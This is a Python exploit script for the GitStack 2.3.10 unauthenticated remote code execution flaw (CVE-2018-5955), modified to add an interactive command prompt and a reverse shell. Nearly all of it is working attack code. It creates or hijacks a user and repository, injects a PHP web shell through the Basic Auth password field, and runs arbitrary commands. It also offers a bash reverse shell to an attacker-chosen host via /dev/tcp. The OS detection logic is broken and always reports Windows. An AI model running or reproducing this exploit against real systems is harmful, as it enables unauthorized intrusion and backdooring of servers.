# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Exploit Modified by MikeTheHash
#		Date: 23.06.2023
#		New features: Interactive RCE, OS Detect, Reverse Shell function
#		Original Exploit: https://www.exploit-db.com/exploits/43777
# CVE: CVE-2018-5955
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys
import colorama

ip = input(colorama.Fore.YELLOW + "[?] IP of target > ")
repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print(" /\_/\")
print("/ O O \")
# idk, its a lil ascii art, and this is an exploit for miniserv, sooo...

print(colorama.Fore.WHITE + "[+] Get user list")
try:
	r = requests.get("http://{}/rest/user/".format(ip))
	user_list = r.json()
	user_list.remove('everyone')
except:
	pass

if len(user_list) > 0:
	username = user_list[0]
	print(colorama.Fore.WHITE + "[+] Found user {}".format(username))
else:
	r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
	print(colorama.Fore.WHITE + "[+] Create user")
	
	if not "User created" in r.text and not "User already exist" in r.text:
		print(colorama.Back.RED + colorama.Fore.WHITE + "[-] Cannot create user")
		os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
	print(colorama.Fore.WHITE + "[+] Web repository already enabled")
else:
	print(colorama.Fore.WHITE + "[+] Enable web repository")
	r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
	if not "Web interface successfully enabled" in r.text:
		print(colorama.Back.RED + colorama.Fore.WHITE + "[-] Cannot enable web interface")
		os._exit(0)

print(colorama.Fore.WHITE + "[+] Get repositories list")
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
	repository = repository_list[0]['name']
	print(colorama.Fore.WHITE + "[+] Found repository {}".format(repository))
else:
	print(colorama.Fore.WHITE + "[+] Create repository")
	r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
		print(colorama.Back.RED + colorama.Fore.WHITE + "[-] Cannot create repository")
		os._exit(0)

print(colorama.Fore.WHITE + "[+] Add user to repository")
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
	print(colorama.Back.RED + colorama.Fore.WHITE + "[-] Cannot add user to repository")
	os._exit(0)	

print(colorama.Fore.WHITE + "[+] Disable access for anyone")
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
	print(colorama.Back.RED + colorama.Fore.WHITE + "[-] Cannot remove access for anyone")
	os._exit(0)	

print(colorama.Fore.WHITE + "[+] Create backdoor in PHP")
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print(r.text.encode(sys.stdout.encoding, errors='replace'))

# From here, the script is modified by MikeTheHash
# Happy hacking!
 
print(colorama.Fore.BLUE + "[*] Type 'shell' to get a reverse shell")

def execute(commandvar):
	print(colorama.Fore.WHITE + "[+] Execute command" + colorama.Style.RESET_ALL)
	r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : commandvar})
	print(r.text.encode(sys.stdout.encoding, errors='replace'))

def checkOS():
	if execute("uname") == "b'"" \r\n'":
		os = "Linux"
	else:
		os = "Windows"
	return os

def shell(os):
	if os == "Linux":
		print(colorama.Fore.BLUE + "[*] Starting the reverse shell process")
		print(colorama.Fore.RED +"[!]" + colorama.Fore.WHITE + " Attention:" + colorama.Fore.BLUE + " YOU NEED TO START NETCAT (nc -nlvp port)")
		ipaddr = input(colorama.Fore.YELLOW + "[?] Please enter the IP address for the shell: ")
		port = input(colorama.Fore.YELLOW + "[?] Please enter the port number for the shell: ")
		execute(f"bash bash -i >& /dev/tcp/{ipaddr}/{port} 0>&1")
	elif os == "Windows":
		print(colorama.Back.RED + colorama.Fore.WHITE + "Not supported on windows" + colorama.Style.RESET_ALL)
	else:
		pass

print(colorama.Fore.BLUE + "[*] OS : " + colorama.Fore.WHITE + checkOS() + colorama.Style.RESET_ALL)
while(True):
	command = input("RCE > ")
	if command == "ls" and checkOS() == "Windows":
		execute("dir")
	elif command == "ifconfig" and checkOS() == "Windows":
		execute("ipconfig")
	elif command == "ipconfig" and checkOS() == "Linux":
		execute("ifconfig")
	elif command == "shell":
		shell(checkOS())
	elif command == "exit":
		exit()
	else:
		execute(command)
